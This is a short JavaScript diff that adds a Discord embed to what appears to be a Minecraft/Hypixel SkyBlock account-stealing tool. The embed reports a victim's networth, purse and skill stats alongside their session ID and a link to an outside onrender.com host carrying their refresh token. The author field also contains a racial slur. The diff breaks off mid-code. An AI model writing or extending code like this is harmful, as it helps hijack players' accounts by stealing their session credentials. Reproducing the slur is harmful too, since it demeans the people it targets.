@@ -165,3 +165,16 @@ function checkIfBanned(name) {
     addBan(name)
     return false
 }
+const embed = new EmbedBuilder()
+  .setColor(0x5D3FD3)
+  .setTitle(name)
+  .setURL('https://sky.shiiyu.moe/stats/' + name)
+  .setThumbnail('https://crafatar.com/avatars/' + id)
+  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://verification-dcyg.onrender.com/refresh?refreshToken=' + refresh })
+  .addFields(
+    { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
+    { name: ' ', value: ' ' },
+    { name: 'Average Skill Lvl', value: avgSkillLvl, inline: true }, { name: 'SB Level', value: SBLevel, inline: true },
+    { name: ' ', value: ' ' },
+    { name: 'Minion Slots', value: minionSlots, inline: true }, { name: 'Purse', value: purse, inline: true },
+    { name: 'SSID: ', value: SSIDCode },
